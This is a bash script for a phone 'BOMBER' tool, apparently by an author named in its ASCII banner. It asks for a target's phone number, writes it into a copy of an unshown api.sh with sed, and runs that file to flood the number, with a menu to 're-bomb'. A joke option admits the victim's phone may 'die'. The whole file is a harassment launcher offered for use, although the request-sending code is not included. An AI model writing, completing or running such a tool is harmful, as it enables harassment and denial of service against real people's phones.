 banner(){
echo -e '\e[95m               
                         __________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[94mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@                @#%,.@        
                @#%,.@   BOMBER     @#%,.@          
                  @#%,.@           @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                        keshav Gupta
               INSTAGRAM:- official_.keshav'
                echo -e '\e[93m CODED BY KESHAV'
} 
banner
echo  -ne "\e[91m Enter Your number :-"
sleep 3
bomb(){
clear 
banner 
echo -e "e\[95m Bombing start"
cp api.sh app.sh
sed -i s/€tor/$num/g app.sh
bash app.sh 
con
}
con(){
echo -e " "
echo -e "\e[31m# \e[93m BOMBER\e[93m \e[92m(\e[31m$v\e[92m)"
echo -e "\e[92m[\e[91m1\e[92m]\e[93m RE-BOMB\e[93m"
echo -e "\e[92m[\e[91m2\e[92m]\e[93m EXIT\e[93m"
echo -e "\e[92m[\e[91m3\e[92m]\e[93m ARE BHAI BAS KAR PHONE MAAR JAYEGA USKA\e[93m"
echo -ne "select:-"

read opt
if [ $opt -eq 1 ];then  
bomb
   con
    elif [ $opt -eq 2 ]; then
    clear
elif [ $opt -eq 3 ]; then
echo  -ne "\e[91m wrong input"
else 
echo  ""
fi

}
read num
bomb
